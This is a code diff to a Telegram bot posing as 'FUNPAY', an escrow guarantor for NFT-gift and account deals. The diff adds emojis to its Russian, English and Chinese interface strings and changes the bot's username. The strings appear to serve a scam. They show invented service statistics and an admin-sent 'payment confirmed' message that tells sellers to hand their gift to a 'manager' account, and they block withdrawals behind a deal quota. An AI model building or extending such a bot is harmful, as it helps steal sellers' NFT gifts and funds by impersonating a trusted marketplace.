@@ -23,10 +23,9 @@ if not BOT_TOKEN:
     raise ValueError("BOT_TOKEN не задан в переменных окружения!")
 
 ADMIN_IDS = [8822297551]
-# Твоя ссылка на фото (желательно прямая, заканчивающаяся на .jpg/.png)
-# Если в Кыргызстане заблокируют, просто замени ссылку на другую или она упадет на текст.
 PHOTO_URL = "https://ibb.co/dsfvdDB7"
-BOT_USERNAME = os.getenv("BOT_USERNAME", "secretariOffreybot")
+# По умолчанию ставим твоего нового бота. В Render также можно прописать BOT_USERNAME=FunpayTrustly_robot
+BOT_USERNAME = os.getenv("BOT_USERNAME", "FunpayTrustly_robot")
 PORT = int(os.getenv("PORT", 8080))
 WEBHOOK_URL = os.getenv("WEBHOOK_URL", "https://funpayd.onrender.com")
 
@@ -111,284 +110,287 @@ class DealStates(StatesGroup):
     profile_requisites_input = State()
 
 # ==================================================
-# ПОЛНЫЙ СЛОВАРЬ ПЕРЕВОДОВ
+# ПОЛНЫЙ СЛОВАРЬ ПЕРЕВОДОВ (С ЭМОДЗИ)
 # ==================================================
 LOCALES = {
     'ru': {
-        'main_menu': "<b># FUNPAY</b>\n\n<b>Безопасный гарант для сделок в Telegram.</b>\n\n<b>Что внутри:</b>\n• защита от мошенников\n• удержание средств до завершения сделки\n• история и статусы сделок\n• поддержка через @GiftsforFunpay\n\n<b>Выберите действие ниже.</b>",
-        'create_deal_msg': 'Выберите вашу роль в сделке:',
-        'create_deal_btn': 'Создать сделку',
-        'funds_btn': 'Средства',
-        'funds_menu': 'Выберите действие:',
-        'seller_role': 'Выберите тип сделки:',
-        'buyer_role': 'Выберите тип сделки:',
-        'deal_type_account': 'Опишите предмет сделки\n\nУкажите важные детали, условия передачи и дополнительные договоренности.',
-        'deal_type_gift': 'Отправьте ссылку на NFT Gift\n\nМожно указать одну или несколько ссылок, например:\nhttps://t.me/nft/DurovsCap-1',
-        'payment_method': 'Выберите способ оплаты:',
-        'amount': 'Введите сумму сделки в {currency}\n\nТолько целое число.',
-        'deal_created': '<b>Сделка #{deal_id} создана</b>\n\n<b>Тип:</b> {deal_type}\n<b>Описание:</b> {description}\n<b>Сумма:</b> {amount} {currency}\n<b>Реквизиты:</b> {requisites}\n\n<b>Ссылка для покупателя:</b>\nhttps://t.me/{bot_username}?start=deal_{deal_id}\n\n<b>Статус:</b> ожидаем покупателя.',
-        'deal_created_buyer': '<b>Сделка #{deal_id} создана</b>\n\n<b>Тип:</b> {deal_type}\n<b>Описание:</b> {description}\n<b>Сумма:</b> {amount} {currency}\n\n<b>Ожидаем подтверждение продавца:</b> {seller_username}\n\n<b>Ссылка для продавца:</b>\nhttps://t.me/{bot_username}?start=deal_{deal_id}',
-        'deal_show_seller': '<b>Сделка #{deal_id}</b>\n<b>Тип:</b> {deal_type}\n<b>Описание:</b> {description}\n<b>Сумма:</b> {amount} {currency}\n<b>Оплата:</b> {currency}\n\n<b>Вы указаны как продавец. Подтвердите участие.</b>',
+        'main_menu': "🛡️ <b># FUNPAY</b>\n\n💎 <b>Безопасный гарант для сделок в Telegram.</b>\n\n📌 <b>Что внутри:</b>\n• 🛡️ защита от мошенников\n• 💰 удержание средств до завершения сделки\n• 📊 история и статусы сделок\n• 📞 поддержка через @GiftsforFunpay\n\n⬇️ <b>Выберите действие ниже.</b>",
+        'create_deal_msg': '📋 Выберите вашу роль в сделке:',
+        'create_deal_btn': '📝 Создать сделку',
+        'funds_btn': '💰 Средства',
+        'funds_menu': '💳 Выберите действие с финансами:',
+        'seller_role': '📦 Выберите тип сделки для продажи:',
+        'buyer_role': '📦 Выберите тип сделки для покупки:',
+        'deal_type_account': '📝 Опишите предмет сделки\n\n📌 Укажите важные детали, условия передачи и дополнительные договоренности.',
+        'deal_type_gift': '🎁 Отправьте ссылку на NFT Gift\n\n📌 Можно указать одну или несколько ссылок, например:\nhttps://t.me/nft/DurovsCap-1',
+        'payment_method': '💳 Выберите способ оплаты:',
+        'amount': '💰 Введите сумму сделки в {currency}\n\nℹ️ Только целое число.',
+        'deal_created': '✅ <b>Сделка #{deal_id} создана</b>\n\n📂 <b>Тип:</b> {deal_type}\n📝 <b>Описание:</b> {description}\n💰 <b>Сумма:</b> {amount} {currency}\n💳 <b>Реквизиты:</b> {requisites}\n\n🔗 <b>Ссылка для покупателя:</b>\nhttps://t.me/{bot_username}?start=deal_{deal_id}\n\n📌 <b>Статус:</b> ожидаем покупателя.',
+        'deal_created_buyer': '✅ <b>Сделка #{deal_id} создана</b>\n\n📂 <b>Тип:</b> {deal_type}\n📝 <b>Описание:</b> {description}\n💰 <b>Сумма:</b> {amount} {currency}\n\n⏳ <b>Ожидаем подтверждение продавца:</b> {seller_username}\n\n🔗 <b>Ссылка для продавца:</b>\nhttps://t.me/{bot_username}?start=deal_{deal_id}',
+        'deal_show_seller': '📌 <b>Сделка #{deal_id}</b>\n📂 <b>Тип:</b> {deal_type}\n📝 <b>Описание:</b> {description}\n💰 <b>Сумма:</b> {amount} {currency}\n💳 <b>Оплата:</b> {currency}\n\n✅ <b>Вы указаны как продавец. Подтвердите участие.</b>',
         'deal_show_buyer': '✅ Вы подключены к сделке #{deal_id}.',
-        'deal_status': '<b>Сделка #{deal_id}</b>\n<b>Тип:</b> {deal_type}\n<b>Описание:</b> {description}\n<b>Сумма:</b> {amount} {currency}\n<b>Статус:</b> {status}',
-        'confirm_requisites': 'Выберите тип реквизитов для подтверждения:',
-        'requisites_saved': 'Реквизиты сохранены. Ожидаем оплату.',
-        'buyer_notify': '✅ Продавец подтвердил участие в сделке #{deal_id}\n\n<b>Тип:</b> {deal_type}\n<b>Описание:</b> {description}\n<b>Сумма:</b> {amount} {currency}\n<b>Реквизиты продавца:</b> {seller_req}',
+        'deal_status': '📌 <b>Сделка #{deal_id}</b>\n📂 <b>Тип:</b> {deal_type}\n📝 <b>Описание:</b> {description}\n💰 <b>Сумма:</b> {amount} {currency}\n🔄 <b>Статус:</b> {status}',
+        'confirm_requisites': '💳 Выберите тип реквизитов для подтверждения:',
+        'requisites_saved': '📌 Реквизиты сохранены. Ожидаем оплату.',
+        'buyer_notify': '📩 ✅ Продавец подтвердил участие в сделке #{deal_id}\n\n📂 <b>Тип:</b> {deal_type}\n📝 <b>Описание:</b> {description}\n💰 <b>Сумма:</b> {amount} {currency}\n💳 <b>Реквизиты продавца:</b> {seller_req}',
         'deal_confirm_seller': '✅ Вы подтвердили участие. Ожидайте оплаты от покупателя.',
-        'novateam_seller': """💳 Оплата подтверждена
+        'novateam_seller': """💸 <b>Оплата подтверждена</b>
 
-Сделка: #{deal_id}
-Покупатель: @{buyer}
-Сумма: {amount} {currency}
-Предмет: {description}
+📌 Сделка: #{deal_id}
+👤 Покупатель: @{buyer}
+💰 Сумма: {amount} {currency}
+📝 Предмет: {description}
 
-🛡 Передайте Подарок Менеджеру @GiftsForFunpay""",
+🛡️ Передайте Подарок Менеджеру @GiftsForFunpay""",
         'novateam_buyer': '✅ Оплата подтверждена по сделке #{deal_id}.',
         'novateam_summary': '✅ Подтверждено {count} сделок.',
-        'funds_menu': 'Выберите действие:',
-        'funds_deposit': 'Введите ID сделки для оплаты',
+        'funds_menu': '💳 Выберите действие:',
+        'funds_deposit': '💳 Введите ID сделки для оплаты',
         'funds_deposit_error': '🚫 Сделка не найдена.',
-        'funds_withdraw': 'Вывести деньги можно только от 2 сделок\nУ Вас 0/2',
+        'funds_withdraw': '💸 Вывести деньги можно только от 2 сделок\n📊 У Вас 0/2',
         'my_deals_empty': '📭 У вас нет активных сделок.',
         'my_deals_list': '📋 Ваши сделки:\n\n{deals}',
-        'requisites_menu': '💳 Ваши реквизиты:\n\nВыберите тип для просмотра или изменения.',
-        'requisites_card': 'Введите номер банковской карты',
-        'requisites_crypto': 'Введите адрес криптокошелька',
-        'requisites_stars': 'Введите юзернейм для получения Stars\n\nНапример: @username',
-        'requisites_saved': 'Реквизиты сохранены.',
+        'requisites_menu': '💳 Ваши реквизиты:\n\n📌 Выберите тип для просмотра или изменения.',
+        'requisites_card': '💳 Введите номер банковской карты',
+        'requisites_crypto': '🪙 Введите адрес криптокошелька',
+        'requisites_stars': '⭐ Введите юзернейм для получения Stars\n\nНапример: @username',
+        'requisites_saved': '✅ Реквизиты сохранены.',
         'lang_menu': '🌐 Выберите язык / Choose language / 选择语言:',
-        'lang_set': 'Язык установлен: {lang}',
+        'lang_set': '🌐 Язык установлен: {lang}',
         'support': '📞 Поддержка: @GiftsforFunpay\n\nПо всем вопросам обращайтесь к менеджеру.',
-        'verify': '''🛡 Верификация
+        'verify': '''🛡️ <b>Верификация</b>
 
-Верификация доступна пользователям с 30+ успешными сделками и оборотом от 1500 USDT.
+📌 Верификация доступна пользователям с 30+ успешными сделками и оборотом от 1500 USDT.
 
-Преимущества:
-• автовывод средств
-• приоритетная поддержка
-• ускоренное решение спорных ситуаций
-Подайте заявку, и администрация рассмотрит ее.''',
-        'verify_button': 'Подать заявку',
-        'referral': '👥 Реферальная система\n\nВаша реферальная ссылка:\nhttps://t.me/{bot_username}?start=ref{user_id}\n\nПриглашено: {ref_count} человек',
-        'about': '''Funpay
+💎 Преимущества:
+• 💸 автовывод средств
+• ⚡ приоритетная поддержка
+• 🏆 ускоренное решение спорных ситуаций
 
-Всего сделок: 107107
-Успешных сделок: 103835
-Общий объем: $1105228
-Рейтинг: 4.9/5.0
-Онлайн: 15756
+📩 Подайте заявку, и администрация рассмотрит ее.''',
+        'verify_button': '📩 Подать заявку',
+        'referral': '👥 Реферальная система\n\n🔗 Ваша реферальная ссылка:\nhttps://t.me/{bot_username}?start=ref{user_id}\n\n👤 Приглашено: {ref_count} человек',
+        'about': '''ℹ️ <b>Funpay</b>
 
-🛡 Гарант-сервис
+📊 Всего сделок: 107107
+✅ Успешных сделок: 103835
+💰 Общий объем: $1105228
+⭐ Рейтинг: 4.9/5.0
+🟢 Онлайн: 15756
+
+🛡️ Гарант-сервис
 ✅ Проверенные продавцы
 📢 Поддержка 24/7
 
 🔗 @GiftsforFunpay''',
         'back': '🔙 Назад',
-        'seller': 'Я продавец',
-        'buyer': 'Я покупатель',
-        'account': 'Аккаунт',
-        'gift': 'NFT Gift',
-        'card': 'Карта',
-        'crypto': 'Крипта',
-        'stars': 'Stars',
-        'rub': 'Рубли',
-        'uah': 'Гривны',
-        'byn': 'BYN',
-        'usdt': 'USDT',
-        'ton': 'TON',
+        'seller': '📦 Я продавец',
+        'buyer': '📦 Я покупатель',
+        'account': '👤 Аккаунт',
+        'gift': '🎁 NFT Gift',
+        'card': '💳 Карта',
+        'crypto': '🪙 Крипта',
+        'stars': '⭐ Stars',
+        'rub': '🇷🇺 Рубли',
+        'uah': '🇺🇦 Гривны',
+        'byn': '🇧🇾 BYN',
+        'usdt': '💎 USDT',
+        'ton': '💎 TON',
         'error_own_ref': '❌ Нельзя перейти по своей собственной реферальной ссылке.',
         'error_own_deal': '❌ Вы являетесь создателем этой сделки. Перейти по собственной ссылке нельзя!',
-        'my_deals': 'Мои сделки',
-        'requisites': 'Реквизиты',
-        'lang': 'Язык',
-        'support': 'Поддержка',
-        'verify': 'Верификация',
-        'referral': 'Рефералы',
-        'about': 'О сервисе'
+        'my_deals': '📦 Мои сделки',
+        'requisites': '💳 Реквизиты',
+        'lang': '🌐 Язык',
+        'support': '🆘 Поддержка',
+        'verify': '🛡️ Верификация',
+        'referral': '👥 Рефералы',
+        'about': 'ℹ️ О сервисе'
     },
     'en': {
-        'main_menu': "<b># FUNPAY</b>\n\n<b>Safe guarantor for deals in Telegram.</b>\n\n<b>What inside:</b>\n• protection from scammers\n• funds holding until deal completion\n• deal history and statuses\n• support via @GiftsforFunpay\n\n<b>Select action below.</b>",
-        'create_deal_msg': 'Choose your role:',
-        'create_deal_btn': 'Create deal',
-        'funds_btn': 'Funds',
-        'funds_menu': 'Select action:',
-        'seller_role': 'Choose deal type:',
-        'buyer_role': 'Choose deal type:',
-        'deal_type_account': 'Describe the deal item\n\nSpecify important details, transfer conditions and additional agreements.',
-        'deal_type_gift': 'Send NFT Gift link\n\nYou can specify one or more links, e.g.:\nhttps://t.me/nft/DurovsCap-1',
-        'payment_method': 'Choose payment method:',
-        'amount': 'Enter deal amount in {currency}\n\nInteger only.',
-        'deal_created': '<b>Deal #{deal_id} created</b>\n\n<b>Type:</b> {deal_type}\n<b>Description:</b> {description}\n<b>Amount:</b> {amount} {currency}\n<b>Requisites:</b> {requisites}\n\n<b>Link for buyer:</b>\nhttps://t.me/{bot_username}?start=deal_{deal_id}\n\n<b>Status:</b> waiting for buyer.',
-        'deal_created_buyer': '<b>Deal #{deal_id} created</b>\n\n<b>Type:</b> {deal_type}\n<b>Description:</b> {description}\n<b>Amount:</b> {amount} {currency}\n\n<b>Waiting for seller confirmation:</b> {seller_username}\n\n<b>Link for seller:</b>\nhttps://t.me/{bot_username}?start=deal_{deal_id}',
-        'deal_show_seller': '<b>Deal #{deal_id}</b>\n<b>Type:</b> {deal_type}\n<b>Description:</b> {description}\n<b>Amount:</b> {amount} {currency}\n<b>Payment:</b> {currency}\n\n<b>You are listed as seller. Confirm participation.</b>',
+        'main_menu': "🛡️ <b># FUNPAY</b>\n\n💎 <b>Safe guarantor for deals in Telegram.</b>\n\n📌 <b>What inside:</b>\n• 🛡️ protection from scammers\n• 💰 funds holding until deal completion\n• 📊 deal history and statuses\n• 📞 support via @GiftsforFunpay\n\n⬇️ <b>Select action below.</b>",
+        'create_deal_msg': '📋 Choose your role:',
+        'create_deal_btn': '📝 Create deal',
+        'funds_btn': '💰 Funds',
+        'funds_menu': '💳 Select action:',
+        'seller_role': '📦 Choose deal type for selling:',
+        'buyer_role': '📦 Choose deal type for buying:',
+        'deal_type_account': '📝 Describe the deal item\n\n📌 Specify important details, transfer conditions and additional agreements.',
+        'deal_type_gift': '🎁 Send NFT Gift link\n\n📌 You can specify one or more links, e.g.:\nhttps://t.me/nft/DurovsCap-1',
+        'payment_method': '💳 Choose payment method:',
+        'amount': '💰 Enter deal amount in {currency}\n\nℹ️ Integer only.',
+        'deal_created': '✅ <b>Deal #{deal_id} created</b>\n\n📂 <b>Type:</b> {deal_type}\n📝 <b>Description:</b> {description}\n💰 <b>Amount:</b> {amount} {currency}\n💳 <b>Requisites:</b> {requisites}\n\n🔗 <b>Link for buyer:</b>\nhttps://t.me/{bot_username}?start=deal_{deal_id}\n\n📌 <b>Status:</b> waiting for buyer.',
+        'deal_created_buyer': '✅ <b>Deal #{deal_id} created</b>\n\n📂 <b>Type:</b> {deal_type}\n📝 <b>Description:</b> {description}\n💰 <b>Amount:</b> {amount} {currency}\n\n⏳ <b>Waiting for seller confirmation:</b> {seller_username}\n\n🔗 <b>Link for seller:</b>\nhttps://t.me/{bot_username}?start=deal_{deal_id}',
+        'deal_show_seller': '📌 <b>Deal #{deal_id}</b>\n📂 <b>Type:</b> {deal_type}\n📝 <b>Description:</b> {description}\n💰 <b>Amount:</b> {amount} {currency}\n💳 <b>Payment:</b> {currency}\n\n✅ <b>You are listed as seller. Confirm participation.</b>',
         'deal_show_buyer': '✅ You are connected to deal #{deal_id}.',
-        'deal_status': '<b>Deal #{deal_id}</b>\n<b>Type:</b> {deal_type}\n<b>Description:</b> {description}\n<b>Amount:</b> {amount} {currency}\n<b>Status:</b> {status}',
-        'confirm_requisites': 'Select requisites type for confirmation:',
-        'requisites_saved': 'Requisites saved. Waiting for payment.',
-        'buyer_notify': '✅ Seller confirmed participation in deal #{deal_id}\n\n<b>Type:</b> {deal_type}\n<b>Description:</b> {description}\n<b>Amount:</b> {amount} {currency}\n<b>Seller requisites:</b> {seller_req}',
+        'deal_status': '📌 <b>Deal #{deal_id}</b>\n📂 <b>Type:</b> {deal_type}\n📝 <b>Description:</b> {description}\n💰 <b>Amount:</b> {amount} {currency}\n🔄 <b>Status:</b> {status}',
+        'confirm_requisites': '💳 Select requisites type for confirmation:',
+        'requisites_saved': '📌 Requisites saved. Waiting for payment.',
+        'buyer_notify': '📩 ✅ Seller confirmed participation in deal #{deal_id}\n\n📂 <b>Type:</b> {deal_type}\n📝 <b>Description:</b> {description}\n💰 <b>Amount:</b> {amount} {currency}\n💳 <b>Seller requisites:</b> {seller_req}',
         'deal_confirm_seller': '✅ You confirmed participation. Waiting for buyer payment.',
-        'novateam_seller': """💳 Payment confirmed
+        'novateam_seller': """💸 <b>Payment confirmed</b>
 
-Deal: #{deal_id}
-Buyer: @{buyer}
-Amount: {amount} {currency}
-Item: {description}
+📌 Deal: #{deal_id}
+👤 Buyer: @{buyer}
+💰 Amount: {amount} {currency}
+📝 Item: {description}
 
-🛡 Transfer the Gift to Manager @GiftsForFunpay""",
+🛡️ Transfer the Gift to Manager @GiftsForFunpay""",
         'novateam_buyer': '✅ Payment confirmed for deal #{deal_id}.',
         'novateam_summary': '✅ Confirmed {count} deals.',
-        'funds_menu': 'Select action:',
-        'funds_deposit': 'Enter deal ID for payment',
+        'funds_menu': '💳 Select action:',
+        'funds_deposit': '💳 Enter deal ID for payment',
         'funds_deposit_error': '🚫 Deal not found.',
-        'funds_withdraw': 'Withdrawal available from 2 deals\nYou have 0/2',
+        'funds_withdraw': '💸 Withdrawal available from 2 deals\n📊 You have 0/2',
         'my_deals_empty': '📭 You have no active deals.',
         'my_deals_list': '📋 Your deals:\n\n{deals}',
-        'requisites_menu': '💳 Your requisites:\n\nSelect type to view or change.',
-        'requisites_card': 'Enter bank card number',
-        'requisites_crypto': 'Enter crypto wallet address',
-        'requisites_stars': 'Enter username for Stars\n\nExample: @username',
-        'requisites_saved': 'Requisites saved.',
+        'requisites_menu': '💳 Your requisites:\n\n📌 Select type to view or change.',
+        'requisites_card': '💳 Enter bank card number',
+        'requisites_crypto': '🪙 Enter crypto wallet address',
+        'requisites_stars': '⭐ Enter username for Stars\n\nExample: @username',
+        'requisites_saved': '✅ Requisites saved.',
         'lang_menu': '🌐 Choose language:',
-        'lang_set': 'Language set: {lang}',
+        'lang_set': '🌐 Language set: {lang}',
         'support': '📞 Support: @GiftsforFunpay\n\nContact manager for any questions.',
-        'verify': '''🛡 Verification
+        'verify': '''🛡️ <b>Verification</b>
 
-Verification available for users with 30+ successful deals and turnover from 1500 USDT.
+📌 Verification available for users with 30+ successful deals and turnover from 1500 USDT.
 
-Benefits:
-• auto withdrawal
-• priority support
-• faster dispute resolution
-Submit request and administration will review it.''',
-        'verify_button': 'Submit request',
-        'referral': '👥 Referral system\n\nYour referral link:\nhttps://t.me/{bot_username}?start=ref{user_id}\n\nInvited: {ref_count} people',
-        'about': '''Funpay
+💎 Benefits:
+• 💸 auto withdrawal
+• ⚡ priority support
+• 🏆 faster dispute resolution
 
-Total deals: 107107
-Successful deals: 103835
-Total volume: $1105228
-Rating: 4.9/5.0
-Online: 15756
+📩 Submit request and administration will review it.''',
+        'verify_button': '📩 Submit request',
+        'referral': '👥 Referral system\n\n🔗 Your referral link:\nhttps://t.me/{bot_username}?start=ref{user_id}\n\n👤 Invited: {ref_count} people',
+        'about': '''ℹ️ <b>Funpay</b>
 
-🛡 Guarantor service
+📊 Total deals: 107107
+✅ Successful deals: 103835
+💰 Total volume: $1105228
+⭐ Rating: 4.9/5.0
+🟢 Online: 15756
+
+🛡️ Guarantor service
 ✅ Verified sellers
 📢 24/7 Support
 
 🔗 @GiftsforFunpay''',
         'back': '🔙 Back',
-        'seller': 'I am seller',
-        'buyer': 'I am buyer',
-        'account': 'Account',
-        'gift': 'NFT Gift',
-        'card': 'Card',
-        'crypto': 'Crypto',
-        'stars': 'Stars',
-        'rub': 'RUB',
-        'uah': 'UAH',
-        'byn': 'BYN',
-        'usdt': 'USDT',
-        'ton': 'TON',
+        'seller': '📦 I am seller',
+        'buyer': '📦 I am buyer',
+        'account': '👤 Account',
+        'gift': '🎁 NFT Gift',
+        'card': '💳 Card',
+        'crypto': '🪙 Crypto',
+        'stars': '⭐ Stars',
+        'rub': '🇷🇺 RUB',
+        'uah': '🇺🇦 UAH',
+        'byn': '🇧🇾 BYN',
+        'usdt': '💎 USDT',
+        'ton': '💎 TON',
         'error_own_ref': '❌ You cannot use your own referral link.',
         'error_own_deal': '❌ You are the creator of this deal. Cannot use your own link!',
-        'my_deals': 'My deals',
-        'requisites': 'Requisites',
-        'lang': 'Language',
-        'support': 'Support',
-        'verify': 'Verification',
-        'referral': 'Referrals',
-        'about': 'About'
+        'my_deals': '📦 My deals',
+        'requisites': '💳 Requisites',
+        'lang': '🌐 Language',
+        'support': '🆘 Support',
+        'verify': '🛡️ Verification',
+        'referral': '👥 Referrals',
+        'about': 'ℹ️ About'
     },
     'zh': {
-        'main_menu': "<b># FUNPAY</b>\n\n<b>Telegram 交易安全担保人。</b>\n\n<b>内容：</b>\n• 防止诈骗\n• 资金托管直至交易完成\n• 交易历史和状态\n• 通过 @GiftsforFunpay 获得支持\n\n<b>选择以下操作。</b>",
-        'create_deal_msg': '选择您在交易中的角色：',
-        'create_deal_btn': '创建交易',
-        'funds_btn': '资金',
-        'funds_menu': '选择操作：',
-        'seller_role': '选择交易类型：',
-        'buyer_role': '选择交易类型：',
-        'deal_type_account': '描述交易物品\n\n指明重要细节、转让条件和额外协议。',
-        'deal_type_gift': '发送 NFT 礼品链接\n\n您可以指定一个或多个链接，例如：\nhttps://t.me/nft/DurovsCap-1',
-        'payment_method': '选择支付方式：',
-        'amount': '输入交易金额（{currency}）\n\n只能是整数。',
-        'deal_created': '<b>交易 #{deal_id} 已创建</b>\n\n<b>类型：</b> {deal_type}\n<b>描述：</b> {description}\n<b>金额：</b> {amount} {currency}\n<b>收款信息：</b> {requisites}\n\n<b>买家链接：</b>\nhttps://t.me/{bot_username}?start=deal_{deal_id}\n\n<b>状态：</b> 等待买家。',
-        'deal_created_buyer': '<b>交易 #{deal_id} 已创建</b>\n\n<b>类型：</b> {deal_type}\n<b>描述：</b> {description}\n<b>金额：</b> {amount} {currency}\n\n<b>等待卖家确认：</b> {seller_username}\n\n<b>卖家链接：</b>\nhttps://t.me/{bot_username}?start=deal_{deal_id}',
-        'deal_show_seller': '<b>交易 #{deal_id}</b>\n<b>类型：</b> {deal_type}\n<b>描述：</b> {description}\n<b>金额：</b> {amount} {currency}\n<b>支付：</b> {currency}\n\n<b>您被列为卖家。请确认参与。</b>',
+        'main_menu': "🛡️ <b># FUNPAY</b>\n\n💎 <b>Telegram 交易安全担保人。</b>\n\n📌 <b>内容：</b>\n• 🛡️ 防止诈骗\n• 💰 资金托管直至交易完成\n• 📊 交易历史和状态\n• 📞 通过 @GiftsforFunpay 获得支持\n\n⬇️ <b>选择以下操作。</b>",
+        'create_deal_msg': '📋 选择您在交易中的角色：',
+        'create_deal_btn': '📝 创建交易',
+        'funds_btn': '💰 资金',
+        'funds_menu': '💳 选择操作：',
+        'seller_role': '📦 选择交易类型：',
+        'buyer_role': '📦 选择交易类型：',
+        'deal_type_account': '📝 描述交易物品\n\n📌 指明重要细节、转让条件和额外协议。',
+        'deal_type_gift': '🎁 发送 NFT 礼品链接\n\n📌 您可以指定一个或多个链接，例如：\nhttps://t.me/nft/DurovsCap-1',
+        'payment_method': '💳 选择支付方式：',
+        'amount': '💰 输入交易金额（{currency}）\n\nℹ️ 只能是整数。',
+        'deal_created': '✅ <b>交易 #{deal_id} 已创建</b>\n\n📂 <b>类型：</b> {deal_type}\n📝 <b>描述：</b> {description}\n💰 <b>金额：</b> {amount} {currency}\n💳 <b>收款信息：</b> {requisites}\n\n🔗 <b>买家链接：</b>\nhttps://t.me/{bot_username}?start=deal_{deal_id}\n\n📌 <b>状态：</b> 等待买家。',
+        'deal_created_buyer': '✅ <b>交易 #{deal_id} 已创建</b>\n\n📂 <b>类型：</b> {deal_type}\n📝 <b>描述：</b> {description}\n💰 <b>金额：</b> {amount} {currency}\n\n⏳ <b>等待卖家确认：</b> {seller_username}\n\n🔗 <b>卖家链接：</b>\nhttps://t.me/{bot_username}?start=deal_{deal_id}',
+        'deal_show_seller': '📌 <b>交易 #{deal_id}</b>\n📂 <b>类型：</b> {deal_type}\n📝 <b>描述：</b> {description}\n💰 <b>金额：</b> {amount} {currency}\n💳 <b>支付：</b> {currency}\n\n✅ <b>您被列为卖家。请确认参与。</b>',
         'deal_show_buyer': '✅ 您已连接到交易 #{deal_id}。',
-        'deal_status': '<b>交易 #{deal_id}</b>\n<b>类型：</b> {deal_type}\n<b>描述：</b> {description}\n<b>金额：</b> {amount} {currency}\n<b>状态：</b> {status}',
-        'confirm_requisites': '选择确认的收款信息类型：',
-        'requisites_saved': '收款信息已保存。等待付款。',
-        'buyer_notify': '✅ 卖家已确认参与交易 #{deal_id}\n\n<b>类型：</b> {deal_type}\n<b>描述：</b> {description}\n<b>金额：</b> {amount} {currency}\n<b>卖家收款信息：</b> {seller_req}',
+        'deal_status': '📌 <b>交易 #{deal_id}</b>\n📂 <b>类型：</b> {deal_type}\n📝 <b>描述：</b> {description}\n💰 <b>金额：</b> {amount} {currency}\n🔄 <b>状态：</b> {status}',
+        'confirm_requisites': '💳 选择确认的收款信息类型：',
+        'requisites_saved': '📌 收款信息已保存。等待付款。',
+        'buyer_notify': '📩 ✅ 卖家已确认参与交易 #{deal_id}\n\n📂 <b>类型：</b> {deal_type}\n📝 <b>描述：</b> {description}\n💰 <b>金额：</b> {amount} {currency}\n💳 <b>卖家收款信息：</b> {seller_req}',
         'deal_confirm_seller': '✅ 您已确认参与。等待买家付款。',
-        'novateam_seller': """💳 付款已确认
+        'novateam_seller': """💸 <b>付款已确认</b>
 
-交易：#{deal_id}
-买家：@{buyer}
-金额：{amount} {currency}
-物品：{description}
+📌 交易：#{deal_id}
+👤 买家：@{buyer}
+💰 金额：{amount} {currency}
+📝 物品：{description}
 
-🛡 将礼品转交给管理员 @GiftsForFunpay""",
+🛡️ 将礼品转交给管理员 @GiftsForFunpay""",
         'novateam_buyer': '✅ 交易 #{deal_id} 的付款已确认。',
         'novateam_summary': '✅ 已确认 {count} 笔交易。',
-        'funds_menu': '选择操作：',
-        'funds_deposit': '输入要支付的交易 ID',
+        'funds_menu': '💳 选择操作：',
+        'funds_deposit': '💳 输入要支付的交易 ID',
         'funds_deposit_error': '🚫 未找到交易。',
-        'funds_withdraw': '提款需要至少 2 笔交易\n您当前 0/2',
+        'funds_withdraw': '💸 提款需要至少 2 笔交易\n📊 您当前 0/2',
         'my_deals_empty': '📭 您没有活跃的交易。',
         'my_deals_list': '📋 您的交易：\n\n{deals}',
-        'requisites_menu': '💳 您的收款信息：\n\n选择类型查看或修改。',
-        'requisites_card': '输入银行卡号',
-        'requisites_crypto': '输入加密货币钱包地址',
-        'requisites_stars': '输入用于接收 Stars 的用户名\n\n例如：@username',
-        'requisites_saved': '收款信息已保存。',
+        'requisites_menu': '💳 您的收款信息：\n\n📌 选择类型查看或修改。',
+        'requisites_card': '💳 输入银行卡号',
+        'requisites_crypto': '🪙 输入加密货币钱包地址',
+        'requisites_stars': '⭐ 输入用于接收 Stars 的用户名\n\n例如：@username',
+        'requisites_saved': '✅ 收款信息已保存。',
         'lang_menu': '🌐 选择语言：',
-        'lang_set': '语言已设置为：{lang}',
+        'lang_set': '🌐 语言已设置为：{lang}',
         'support': '📞 支持：@GiftsforFunpay\n\n如有任何问题，请联系经理。',
-        'verify': '''🛡 认证
+        'verify': '''🛡️ <b>认证</b>
 
-拥有 30 笔以上成功交易且交易额超过 1500 USDT 的用户可获得认证。
+📌 拥有 30 笔以上成功交易且交易额超过 1500 USDT 的用户可获得认证。
 
-优势：
-• 自动提款
-• 优先支持
-• 加速解决争议
-提交申请，管理员将进行审核。''',
-        'verify_button': '提交申请',
-        'referral': '👥 推荐系统\n\n您的推荐链接：\nhttps://t.me/{bot_username}?start=ref{user_id}\n\n已邀请：{ref_count} 人',
-        'about': '''Funpay
+💎 优势：
+• 💸 自动提款
+• ⚡ 优先支持
+• 🏆 加速解决争议
 
-总交易数：107107
-成功交易：103835
-总交易额：$1105228
-评分：4.9/5.0
-在线：15756
+📩 提交申请，管理员将进行审核。''',
+        'verify_button': '📩 提交申请',
+        'referral': '👥 推荐系统\n\n🔗 您的推荐链接：\nhttps://t.me/{bot_username}?start=ref{user_id}\n\n👤 已邀请：{ref_count} 人',
+        'about': '''ℹ️ <b>Funpay</b>
 
-🛡 担保服务
+📊 总交易数：107107
+✅ 成功交易：103835
+💰 总交易额：$1105228
+⭐ 评分：4.9/5.0
+🟢 在线：15756
+
+🛡️ 担保服务
 ✅ 已认证卖家
 📢 24/7 支持
 
 🔗 @GiftsForFunpay''',
         'back': '🔙 返回',
-        'seller': '我是卖家',
-        'buyer': '我是买家',
-        'account': '账号',
-        'gift': 'NFT礼品',
-        'card': '银行卡',
-        'crypto': '加密货币',
-        'stars': 'Stars',
-        'rub': '卢布',
-        'uah': '格里夫纳',
-        'byn': '白俄罗斯卢布',
-        'usdt': 'USDT',
-        'ton': 'TON',
+        'seller': '📦 我是卖家',
+        'buyer': '📦 我是买家',
+        'account': '👤 账号',
+        'gift': '🎁 NFT礼品',
+        'card': '💳 银行卡',
+        'crypto': '🪙 加密货币',
+        'stars': '⭐ Stars',
+        'rub': '🇷🇺 卢布',
+        'uah': '🇺🇦 格里夫纳',
+        'byn': '🇧🇾 白俄罗斯卢布',
+        'usdt': '💎 USDT',
+        'ton': '💎 TON',
         'error_own_ref': '❌ 不能使用您自己的推荐链接。',
         'error_own_deal': '❌ 您是该交易的创建者。不能使用您自己的链接！',
-        'my_deals': '我的交易',
-        'requisites': '收款信息',
-        'lang': '语言',
-        'support': '支持',
-        'verify': '认证',
-        'referral': '推荐',
-        'about': '关于服务'
+        'my_deals': '📦 我的交易',
+        'requisites': '💳 收款信息',
+        'lang': '🌐 语言',
+        'support': '🆘 支持',
+        'verify': '🛡️ 认证',
+        'referral': '👥 推荐',
